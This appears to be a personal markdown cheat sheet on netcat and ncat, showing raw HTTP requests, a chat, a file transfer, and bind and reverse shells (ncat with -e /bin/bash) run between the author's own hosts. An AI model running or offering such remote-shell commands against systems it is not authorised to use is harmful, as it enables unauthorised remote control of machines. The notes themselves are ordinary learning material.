***
### About:
Tool using to read and write data across connections using TCP or UDP.
Have 3 versions from BSD(I use), GNU and Nmap.

***
### Use Cases:

- #### use to send request to aiblogger.com:80
```sh
$ nc aiblogger.com 80                                       
GET /
<!doctype html>
<title>Posts - Flaskr</title>
<link rel="stylesheet" href="/static/style.css">

<nav>
  <h1>Aiblogger</h1>
```

 - #### use to set up tcp connection (chat) using netcat
```sh
ubuntu@host1:~$ nc -vl 833
Listening on 0.0.0.0 833
Connection received on host2 52840
Hi!
```

```sh
bohdan@host2 $ nc host1 833
Hi!
```

- #### use to send file using netcat
```sh
ubuntu@host1:~$ nc -vl 833 > sharedfile.txt
Listening on 0.0.0.0 833
Connection received on host2 52840

ubuntu@host1:~$ ls
sharedfile.txt
```

```sh
bohdan@host2 $ cat > file_to_send
just text

bohdan@host2 $ nc 18.185.104.146 833 < file_to_send
```

- #### used to execute commands using ncat on target host
(switch to Nmap version of netcat)
```sh
ubuntu@host1:~$ ncat -vl 833 -e /bin/bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::833
Ncat: Listening on 0.0.0.0:833
Ncat: Connection from host2.
Ncat: Connection from host2:47148.
```

```sh
bohdan@host2 $ nc host1 833
ls
sharedfile.txt
```

- #### send your shell using ncat
```sh
ubuntu@host1:~$ sudo ncat -lv 833
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::833
Ncat: Listening on 0.0.0.0:833
Ncat: Connection from host2.
Ncat: Connection from host2:43984.
ls
file_to_send
```

```sh
bohdan@host2 $ ncat host1 833 -e /bin/bash 
```

***
### Keys:
```sh

```

***
### Help:
```sh

```

***
